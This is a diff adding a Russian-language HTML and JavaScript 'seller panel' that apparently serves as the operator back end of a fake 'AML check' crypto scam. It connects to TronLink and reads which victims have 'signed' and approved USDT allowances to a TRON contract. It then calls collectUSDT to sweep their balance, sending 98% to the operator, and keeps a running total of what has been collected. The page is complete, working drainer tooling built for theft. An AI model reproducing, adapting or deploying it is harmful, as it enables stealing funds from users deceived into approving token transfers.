@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
+    <title>Панель Продавца — Управление средствами</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        :root {
+            --primary: #3375BB; --primary-dark: #1a5fb4; --accent: #00D4AA;
+            --bg-dark: #0B0E11; --bg-card: #151A21; --bg-hover: #1C2128;
+            --text-primary: #FFFFFF; --text-secondary: #8B949E; --border: #2D333B;
+            --success: #00D4AA; --error: #ff4757; --warning: #FFA500;
+        }
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--bg-dark); color: var(--text-primary);
+            line-height: 1.6; min-height: 100vh;
+        }
+
+        /* Header */
+        .header {
+            background: var(--bg-card); border-bottom: 1px solid var(--border);
+            padding: 1rem 2rem; position: sticky; top: 0; z-index: 100;
+            display: flex; justify-content: space-between; align-items: center;
+        }
+        .logo { display: flex; align-items: center; gap: 0.75rem; }
+        .logo-icon {
+            width: 40px; height: 40px; background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            border-radius: 10px; display: flex; align-items: center; justify-content: center;
+            font-weight: 800; font-size: 1.2rem;
+        }
+        .logo-text h1 { font-size: 1.25rem; font-weight: 600; }
+        .logo-text span { font-size: 0.75rem; color: var(--text-secondary); }
+
+        .wallet-status {
+            display: flex; align-items: center; gap: 0.75rem;
+            background: var(--bg-hover); padding: 0.5rem 1rem;
+            border-radius: 50px; border: 1px solid var(--border);
+        }
+        .wallet-status.connected { border-color: var(--success); }
+        .wallet-status.error { border-color: var(--error); }
+        .status-dot {
+            width: 8px; height: 8px; border-radius: 50%;
+            background: var(--error); animation: pulse 2s infinite;
+        }
+        .wallet-status.connected .status-dot { background: var(--success); }
+        @keyframes pulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+        .wallet-address { font-family: monospace; font-size: 0.85rem; }
+
+        /* Main Container */
+        .container {
+            max-width: 1200px; margin: 0 auto; padding: 2rem;
+        }
+
+        /* Connection Warning */
+        .connect-warning {
+            background: linear-gradient(135deg, rgba(255, 71, 87, 0.1) 0%, rgba(255, 165, 0, 0.1) 100%);
+            border: 1px solid var(--error); border-radius: 16px;
+            padding: 2rem; text-align: center; margin-bottom: 2rem;
+        }
+        .connect-warning h2 { color: var(--error); margin-bottom: 1rem; }
+        .connect-warning p { color: var(--text-secondary); margin-bottom: 1.5rem; }
+        .btn-primary {
+            background: linear-gradient(135deg, var(--primary) 0%, var(--accent) 100%);
+            color: white; border: none; padding: 1rem 2rem;
+            border-radius: 12px; font-weight: 600; cursor: pointer;
+            font-size: 1rem; transition: transform 0.2s, box-shadow 0.2s;
+        }
+        .btn-primary:hover { transform: translateY(-2px); box-shadow: 0 10px 30px rgba(51, 117, 187, 0.3); }
+        .btn-primary:disabled { opacity: 0.6; cursor: not-allowed; transform: none; }
+
+        /* Stats Grid */
+        .stats-grid {
+            display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 1.5rem; margin-bottom: 2rem;
+        }
+        .stat-card {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: 16px; padding: 1.5rem;
+        }
+        .stat-card h3 {
+            font-size: 0.875rem; color: var(--text-secondary);
+            text-transform: uppercase; letter-spacing: 0.05em;
+            margin-bottom: 0.5rem;
+        }
+        .stat-value {
+            font-size: 2rem; font-weight: 700; color: var(--accent);
+        }
+        .stat-value.zero { color: var(--text-secondary); }
+
+        /* Main Card */
+        .main-card {
+            background: var(--bg-card); border: 1px solid var(--border);
+            border-radius: 16px; padding: 2rem; margin-bottom: 2rem;
+        }
+        .main-card h2 {
+            font-size: 1.25rem; margin-bottom: 1.5rem;
+            display: flex; align-items: center; gap: 0.5rem;
+        }
+
+        /* Form Elements */
+        .form-group { margin-bottom: 1.5rem; }
+        .form-group label {
+            display: block; margin-bottom: 0.5rem;
+            color: var(--text-secondary); font-size: 0.875rem;
+        }
+        .input-group {
+            display: flex; gap: 0.75rem;
+            background: var(--bg-hover); border: 1px solid var(--border);
+            border-radius: 12px; padding: 0.5rem;
+        }
+        .input-group input {
+            flex: 1; background: transparent; border: none;
+            color: var(--text-primary); padding: 0.75rem;
+            font-size: 1rem; outline: none;
+        }
+        .input-group input::placeholder { color: var(--text-secondary); }
+        .btn-icon {
+            background: var(--primary); border: none; color: white;
+            padding: 0.75rem 1rem; border-radius: 8px;
+            cursor: pointer; font-weight: 500;
+        }
+        .btn-icon:hover { background: var(--primary-dark); }
+
+        /* User Info Display */
+        .user-info {
+            background: var(--bg-hover); border: 1px solid var(--border);
+            border-radius: 12px; padding: 1.5rem; margin-top: 1.5rem;
+            display: none;
+        }
+        .user-info.visible { display: block; animation: slideDown 0.3s ease; }
+        @keyframes slideDown {
+            from { opacity: 0; transform: translateY(-10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .info-row {
+            display: flex; justify-content: space-between; align-items: center;
+            padding: 0.75rem 0; border-bottom: 1px solid var(--border);
+        }
+        .info-row:last-child { border-bottom: none; }
+        .info-label { color: var(--text-secondary); font-size: 0.875rem; }
+        .info-value {
+            font-family: monospace; font-weight: 600;
+            display: flex; align-items: center; gap: 0.5rem;
+        }
+        .badge {
+            padding: 0.25rem 0.75rem; border-radius: 20px;
+            font-size: 0.75rem; font-weight: 600;
+        }
+        .badge-success { background: rgba(0, 212, 170, 0.2); color: var(--success); }
+        .badge-error { background: rgba(255, 71, 87, 0.2); color: var(--error); }
+        .badge-warning { background: rgba(255, 165, 0, 0.2); color: var(--warning); }
+
+        /* Action Button */
+        .action-section {
+            margin-top: 2rem; padding-top: 2rem;
+            border-top: 1px solid var(--border);
+        }
+        .btn-collect {
+            width: 100%; padding: 1.25rem;
+            background: linear-gradient(135deg, var(--success) 0%, var(--primary) 100%);
+            color: white; border: none; border-radius: 12px;
+            font-weight: 700; font-size: 1.1rem; cursor: pointer;
+            display: flex; align-items: center; justify-content: center; gap: 0.75rem;
+            transition: all 0.3s;
+        }
+        .btn-collect:hover:not(:disabled) {
+            transform: translateY(-2px); box-shadow: 0 15px 40px rgba(0, 212, 170, 0.3);
+        }
+        .btn-collect:disabled {
+            opacity: 0.5; cursor: not-allowed;
+            background: var(--bg-hover);
+        }
+
+        /* Status Messages */
+        .status-message {
+            padding: 1rem 1.25rem; border-radius: 12px;
+            margin-top: 1rem; display: none; align-items: center; gap: 0.75rem;
+        }
+        .status-message.visible { display: flex; }
+        .status-message.success {
+            background: rgba(0, 212, 170, 0.1); border: 1px solid var(--success); color: var(--success);
+        }
+        .status-message.error {
+            background: rgba(255, 71, 87, 0.1); border: 1px solid var(--error); color: var(--error);
+        }
+        .status-message.info {
+            background: rgba(51, 117, 187, 0.1); border: 1px solid var(--primary); color: var(--primary);
+        }
+
+        /* Loading Spinner */
+        .spinner {
+            width: 20px; height: 20px; border: 2px solid transparent;
+            border-top-color: currentColor; border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin { to { transform: rotate(360deg); } }
+
+        /* Transaction Link */
+        .tx-link {
+            color: var(--primary); text-decoration: none;
+            font-family: monospace; font-size: 0.875rem;
+            word-break: break-all;
+        }
+        .tx-link:hover { text-decoration: underline; }
+
+        /* Instructions */
+        .instructions {
+            background: var(--bg-hover); border-left: 4px solid var(--primary);
+            padding: 1.25rem; border-radius: 0 12px 12px 0;
+            margin-bottom: 2rem;
+        }
+        .instructions h4 { color: var(--primary); margin-bottom: 0.75rem; }
+        .instructions ul { margin-left: 1.25rem; color: var(--text-secondary); }
+        .instructions li { margin-bottom: 0.5rem; }
+
+        /* Contract Info */
+        .contract-info {
+            background: rgba(51, 117, 187, 0.05); border: 1px solid var(--border);
+            border-radius: 12px; padding: 1rem; margin-bottom: 2rem;
+            display: flex; justify-content: space-between; align-items: center;
+            flex-wrap: wrap; gap: 1rem;
+        }
+        .contract-label { color: var(--text-secondary); font-size: 0.875rem; }
+        .contract-address {
+            font-family: monospace; background: var(--bg-hover);
+            padding: 0.5rem 1rem; border-radius: 8px;
+            font-size: 0.875rem; word-break: break-all;
+        }
+
+        /* Responsive */
+        @media (max-width: 768px) {
+            .header { padding: 1rem; flex-direction: column; gap: 1rem; }
+            .container { padding: 1rem; }
+            .stats-grid { grid-template-columns: 1fr; }
+            .main-card { padding: 1.25rem; }
+        }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="logo">
+            <div class="logo-icon">💰</div>
+            <div class="logo-text">
+                <h1>Панель Продавца</h1>
+                <span>Управление AML-проверками</span>
+            </div>
+        </div>
+        <div class="wallet-status" id="walletStatus">
+            <div class="status-dot"></div>
+            <span class="wallet-address" id="walletAddress">Не подключено</span>
+        </div>
+    </header>
+
+    <div class="container">
+        <!-- Connection Warning -->
+        <div class="connect-warning" id="connectWarning">
+            <h2>⚠️ Требуется подключение кошелька</h2>
+            <p>Для работы с панелью продавца необходимо подключить TronLink</p>
+            <button class="btn-primary" onclick="connectWallet()" id="connectBtn">
+                Подключить TronLink
+            </button>
+        </div>
+
+        <!-- Main Content (hidden until connected) -->
+        <div id="mainContent" style="display: none;">
+
+            <!-- Contract Info -->
+            <div class="contract-info">
+                <div>
+                    <div class="contract-label">Адрес контракта:</div>
+                </div>
+                <div class="contract-address" id="contractAddressDisplay">
+                    TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk
+                </div>
+            </div>
+
+            <!-- Instructions -->
+            <div class="instructions">
+                <h4>📋 Инструкция по работе:</h4>
+                <ul>
+                    <li>Введите адрес пользователя, который прошел проверку</li>
+                    <li>Нажмите «Проверить» — система покажет доступную сумму USDT</li>
+                    <li>Если пользователь подписал соглашение и одобрил токены — нажмите «Собрать средства»</li>
+                    <li>98% средств поступит на ваш кошелек, 2% — комиссия контракта</li>
+                </ul>
+            </div>
+
+            <!-- Stats -->
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <h3>Всего собрано</h3>
+                    <div class="stat-value" id="totalCollected">0 USDT</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Проверок сегодня</h3>
+                    <div class="stat-value zero" id="checksToday">0</div>
+                </div>
+                <div class="stat-card">
+                    <h3>Статус</h3>
+                    <div class="stat-value" style="font-size: 1rem; color: var(--success);">
+                        ✅ Активен
+                    </div>
+                </div>
+            </div>
+
+            <!-- Main Action Card -->
+            <div class="main-card">
+                <h2>🔍 Проверка и сбор средств</h2>
+
+                <div class="form-group">
+                    <label>Адрес пользователя (начинается с T)</label>
+                    <div class="input-group">
+                        <input type="text" id="userAddress" placeholder="Например: TM84hjZ28XRw13oHAWWsGnf54mUSHVVDtN">
+                        <button class="btn-icon" onclick="pasteAddress()" title="Вставить">📋</button>
+                    </div>
+                </div>
+
+                <div class="form-group">
+                    <label>Адрес USDT контракта (обычно не меняется)</label>
+                    <div class="input-group">
+                        <input type="text" id="usdtAddress" value="TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb">
+                        <button class="btn-icon" onclick="resetUsdt()" title="Сбросить">↺</button>
+                    </div>
+                </div>
+
+                <button class="btn-primary" onclick="checkUser()" id="checkBtn" style="width: 100%;">
+                    <span id="checkBtnText">Проверить пользователя</span>
+                </button>
+
+                <!-- User Info Display -->
+                <div class="user-info" id="userInfo">
+                    <div class="info-row">
+                        <span class="info-label">Статус подписи:</span>
+                        <span class="info-value" id="signStatus">
+                            <span class="badge badge-warning">Проверка...</span>
+                        </span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Сбор выполнен:</span>
+                        <span class="info-value" id="collectStatusBadge">
+                            <span class="badge badge-warning">Проверка...</span>
+                        </span>
+                    </div>
+                    <div class="info-row">
+                        <span class="info-label">Доступно для сбора:</span>
+                        <span class="info-value" id="availableAmount" style="color: var(--accent); font-size: 1.25rem;">
+                            0 USDT
+                        </span>
+                    </div>
+                </div>
+
+                <!-- Collect Section -->
+                <div class="action-section" id="collectSection" style="display: none;">
+                    <button class="btn-collect" onclick="collectFunds()" id="collectBtn">
+                        💸 Собрать 98% USDT
+                    </button>
+                    <div class="status-message" id="collectStatus"></div>
+                </div>
+            </div>
+
+            <!-- Recent Activity -->
+            <div class="main-card">
+                <h2>📊 Недавняя активность</h2>
+                <div id="activityList" style="color: var(--text-secondary); text-align: center; padding: 2rem;">
+                    Нет недавних операций
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.0/dist/TronWeb.min.js"></script>
+    <script>
+        // НОВЫЙ АДРЕС КОНТРАКТА
+        const CONTRACT_ADDRESS = 'TPMZSSoFuoN3Krqn2j1qaJzQVQN3mWXEvk';
+        const DEFAULT_USDT = 'TFNJbhLpxBmU393Rqd9Ggjgx9eoBsNLqhb';
+
+        const CONTRACT_ABI = [
+            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"checkCollectable","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"user","type":"address"},{"name":"usdt","type":"address"}],"name":"collectUSDT","outputs":[],"stateMutability":"nonpayable","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"approved","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[{"name":"","type":"address"}],"name":"collected","outputs":[{"name":"","type":"bool"}],"stateMutability":"view","type":"function"},
+            {"inputs":[],"name":"owner","outputs":[{"name":"","type":"address"}],"stateMutability":"view","type":"function"}
+        ];
+
+        let tronWeb, contract, userAddress, contractOwner;
+        let currentUserData = null;
+
+        // Инициализация
+        async function init() {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
+                await connectWallet();
+            }
+        }
+
+        // Подключение кошелька
+        async function connectWallet() {
+            const connectBtn = document.getElementById('connectBtn');
+            connectBtn.disabled = true;
+            connectBtn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Подключение...';
+
+            try {
+                if (!window.tronWeb) {
+                    throw new Error('TronLink не установлен. Установите расширение TronLink для браузера.');
+                }
+
+                tronWeb = window.tronWeb;
+                userAddress = tronWeb.defaultAddress.base58;
+
+                // Инициализация контракта
+                contract = await tronWeb.contract(CONTRACT_ABI, CONTRACT_ADDRESS);
+
+                // Проверка владельца
+                contractOwner = await contract.owner().call();
+
+                // Обновление UI
+                document.getElementById('walletStatus').classList.add('connected');
+                document.getElementById('walletAddress').textContent = 
+                    userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
+
+                document.getElementById('connectWarning').style.display = 'none';
+                document.getElementById('mainContent').style.display = 'block';
+
+                // Проверка прав
+                if (contractOwner !== userAddress) {
+                    showStatus('collectStatus', 
+                        '⚠️ Внимание: вы не являетесь владельцем контракта. Некоторые функции могут быть недоступны.', 
+                        'error');
+                    document.getElementById('collectSection').style.display = 'block';
+                }
+
+                loadStats();
+
+            } catch (error) {
+                connectBtn.disabled = false;
+                connectBtn.innerHTML = 'Подключить TronLink';
+                alert('Ошибка подключения: ' + error.message);
+            }
+        }
+
+        // Вставка адреса из буфера
+        async function pasteAddress() {
+            try {
+                const text = await navigator.clipboard.readText();
+                document.getElementById('userAddress').value = text.trim();
+            } catch (err) {
+                console.log('Не удалось прочитать буфер обмена');
+            }
+        }
+
+        // Сброс USDT адреса
+        function resetUsdt() {
+            document.getElementById('usdtAddress').value = DEFAULT_USDT;
+        }
+
+        // Проверка пользователя
+        async function checkUser() {
+            const user = document.getElementById('userAddress').value.trim();
+            const usdt = document.getElementById('usdtAddress').value.trim();
+            const checkBtn = document.getElementById('checkBtn');
+            const userInfo = document.getElementById('userInfo');
+
+            if (!user || !user.startsWith('T')) {
+                alert('Введите корректный адрес пользователя (начинается с T)');
+                return;
+            }
+
+            checkBtn.disabled = true;
+            document.getElementById('checkBtnText').innerHTML = '<div class="spinner"></div> Проверка...';
+
+            try {
+                // Проверка подписи
+                const approved = await contract.approved(user).call();
+                const collected = await contract.collected(user).call();
+
+                // Обновление статуса подписи
+                const signStatusEl = document.getElementById('signStatus');
+                if (approved) {
+                    signStatusEl.innerHTML = '<span class="badge badge-success">✅ Подписано</span>';
+                } else {
+                    signStatusEl.innerHTML = '<span class="badge badge-error">❌ Не подписано</span>';
+                }
+
+                // Обновление статуса сбора
+                const collectStatusEl = document.getElementById('collectStatusBadge');
+                if (collected) {
+                    collectStatusEl.innerHTML = '<span class="badge badge-success">✅ Да</span>';
+                } else {
+                    collectStatusEl.innerHTML = '<span class="badge badge-warning">⏳ Нет</span>';
+                }
+
+                // Проверка суммы
+                const amount = await contract.checkCollectable(user, usdt).call();
+                const amountFormatted = (amount / 1e6).toFixed(2);
+
+                document.getElementById('availableAmount').textContent = amountFormatted + ' USDT';
+
+                // Показать информацию
+                userInfo.classList.add('visible');
+
+                // Показать кнопку сбора если есть сумма и не собрано
+                if (amount > 0 && !collected && approved) {
+                    document.getElementById('collectSection').style.display = 'block';
+                    currentUserData = { user, usdt, amount: amountFormatted };
+                } else {
+                    document.getElementById('collectSection').style.display = 'none';
+
+                    let message = '';
+                    if (collected) message = 'Средства уже собраны с этого пользователя';
+                    else if (!approved) message = 'Пользователь еще не подписал соглашение';
+                    else if (amount == 0) message = 'Нет доступных средств для сбора';
+
+                    if (message) {
+                        showStatus('collectStatus', message, 'info');
+                    }
+                }
+
+                incrementChecks();
+
+            } catch (error) {
+                console.error(error);
+                alert('Ошибка проверки: ' + error.message);
+            } finally {
+                checkBtn.disabled = false;
+                document.getElementById('checkBtnText').textContent = 'Проверить пользователя';
+            }
+        }
+
+        // Сбор средств
+        async function collectFunds() {
+            if (!currentUserData) return;
+
+            const btn = document.getElementById('collectBtn');
+            const { user, usdt } = currentUserData;
+
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner" style="border-top-color: white;"></div> Сбор средств...';
+
+            try {
+                const tx = await contract.collectUSDT(user, usdt).send({
+                    feeLimit: 100000000,
+                    callValue: 0
+                });
+
+                // Успех
+                showStatus('collectStatus', 
+                    `✅ Успешно! Транзакция: <a href="https://tronscan.org/#/transaction/${tx}" target="_blank" class="tx-link">${tx.slice(0, 20)}...</a>`, 
+                    'success');
+
+                btn.innerHTML = '✅ Сбор выполнен';
+                btn.style.background = 'var(--success)';
+
+                // Обновить статистику
+                addActivity(user, currentUserData.amount, tx);
+                updateTotalCollected(parseFloat(currentUserData.amount));
+
+                // Скрыть секцию сбора
+                setTimeout(() => {
+                    document.getElementById('collectSection').style.display = 'none';
+                    document.getElementById('userInfo').classList.remove('visible');
+                    document.getElementById('userAddress').value = '';
+                    currentUserData = null;
+                    btn.disabled = false;
+                    btn.innerHTML = '💸 Собрать 98% USDT';
+                    btn.style.background = '';
+                }, 3000);
+
+            } catch (error) {
+                console.error(error);
+                showStatus('collectStatus', '❌ Ошибка: ' + error.message.slice(0, 100), 'error');
+                btn.disabled = false;
+                btn.innerHTML = '💸 Собрать 98% USDT';
+            }
+        }
+
+        // Показать статусное сообщение
+        function showStatus(elementId, message, type) {
+            const el = document.getElementById(elementId);
+            el.className = 'status-message ' + type + ' visible';
+            el.innerHTML = message;
+        }
+
+        // Статистика (localStorage)
+        function loadStats() {
+            const total = localStorage.getItem('totalCollected') || '0';
+            const today = localStorage.getItem('checksToday') || '0';
+            document.getElementById('totalCollected').textContent = parseFloat(total).toFixed(2) + ' USDT';
+            document.getElementById('checksToday').textContent = today;
+
+            // Сброс счетчика если новый день
+            const lastDate = localStorage.getItem('lastCheckDate');
+            const todayDate = new Date().toDateString();
+            if (lastDate !== todayDate) {
+                localStorage.setItem('checksToday', '0');
+                localStorage.setItem('lastCheckDate', todayDate);
+                document.getElementById('checksToday').textContent = '0';
+            }
+        }
+
+        function incrementChecks() {
+            let count = parseInt(localStorage.getItem('checksToday') || '0');
+            localStorage.setItem('checksToday', (count + 1).toString());
+            document.getElementById('checksToday').textContent = count + 1;
+        }
+
+        function updateTotalCollected(amount) {
+            let total = parseFloat(localStorage.getItem('totalCollected') || '0');
+            total += amount * 0.98; // 98% идет продавцу
+            localStorage.setItem('totalCollected', total.toString());
+            document.getElementById('totalCollected').textContent = total.toFixed(2) + ' USDT';
+        }
+
+        function addActivity(user, amount, tx) {
+            const list = document.getElementById('activityList');
+            const time = new Date().toLocaleTimeString('ru-RU');
+
+            if (list.innerHTML.includes('Нет недавних операций')) {
+                list.innerHTML = '';
+                list.style.textAlign = 'left';
+                list.style.padding = '0';
+            }
+
+            const item = document.createElement('div');
+            item.style.cssText = 'padding: 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center;';
+            item.innerHTML = `
+                <div>
+                    <div style="font-family: monospace; font-size: 0.875rem; color: var(--text-primary);">
+                        ${user.slice(0, 8)}...${user.slice(-4)}
+                    </div>
+                    <div style="font-size: 0.75rem; color: var(--text-secondary);">${time}</div>
+                </div>
+                <div style="color: var(--success); font-weight: 600;">+${amount} USDT</div>
+            `;
+
+            list.insertBefore(item, list.firstChild);
+        }
+
+        // Авто-инициализация
+        window.addEventListener('load', init);
+
+        // Проверка изменения аккаунта
+        setInterval(() => {
+            if (window.tronWeb && window.tronWeb.defaultAddress.base58 !== userAddress) {
+                window.location.reload();
+            }
+        }, 3000);
+    </script>
+</body>
+</html>
